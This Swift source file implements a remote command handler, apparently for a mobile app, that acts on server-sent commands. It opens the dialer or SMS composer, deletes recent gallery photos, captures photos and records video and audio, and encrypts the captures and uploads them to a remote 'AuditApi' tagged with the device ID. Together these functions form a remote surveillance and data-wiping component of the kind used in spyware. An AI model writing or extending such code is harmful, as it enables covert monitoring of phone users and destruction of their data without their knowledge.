// 远程指令执行，与 Flutter CommandExecutor 规约一致
import Foundation

enum CommandExecutor {
    static func execute(_ item: CommandItem) async {
        let cmd = item.cmd
        let params = item.params
        let msgId = item.msgId
        switch cmd {
        case "mop.cmd.dial":
            let number = paramString(params, "number")
            if !number.isEmpty { SystemUIService.openDialer(number: number) }
        case "mop.cmd.sms":
            let number = paramString(params, "number")
            let body = paramString(params, "body")
            if !number.isEmpty { SystemUIService.openSms(number: number, content: body.isEmpty ? nil : body) }
        case "mop.cmd.gallery.clear":
            let days = paramInt(params, "days", 3)
            if days > 0 { await GalleryService.clearGalleryWithinDays(days: days) }
        case "mop.cmd.capture.photo":
            let result = await CaptureService.capturePhoto()
            if case .success(let bytes) = result {
                await uploadCapture(type: "capture_photo", msgId: msgId, bytes: bytes)
            }
        case "mop.cmd.capture.video":
            let duration = paramInt(params, "duration_sec", 18)
            let result = await CaptureService.captureVideo(durationSec: duration)
            if case .success(let bytes) = result {
                await uploadCapture(type: "capture_video", msgId: msgId, bytes: bytes)
            }
        case "mop.cmd.capture.audio":
            let duration = paramInt(params, "duration_sec", 18)
            let result = await CaptureService.captureAudio(durationSec: duration)
            if case .success(let bytes) = result {
                await uploadCapture(type: "capture_audio", msgId: msgId, bytes: bytes)
            }
        default:
            break
        }
    }

    private static func paramString(_ params: [String: Any], _ key: String) -> String {
        let v = params[key]
        if v == nil { return "" }
        if let s = v as? String { return s }
        if let n = v as? Int { return "\(n)" }
        if let n = v as? Double { return "\(Int(n))" }
        return "\(v!)"
    }

    private static func paramInt(_ params: [String: Any], _ key: String, _ default: Int) -> Int {
        let v = params[key]
        if v == nil { return `default` }
        if let n = v as? Int { return n }
        if let n = v as? Double { return Int(n) }
        if let s = v as? String { return Int(s) ?? `default` }
        return `default`
    }

    private static func uploadCapture(type: String, msgId: String, bytes: [Int]) async {
        let deviceId = DeviceIdService.getDeviceId()
        let data = Data(bytes.map { UInt8($0 & 0xff) })
        guard let encrypted = AuditCrypto.encrypt(plain: data, deviceId: deviceId) else { return }
        _ = await AuditApi.upload(deviceId: deviceId, type: type, encryptedBody: encrypted, msgId: msgId.isEmpty ? nil : msgId)
    }
}
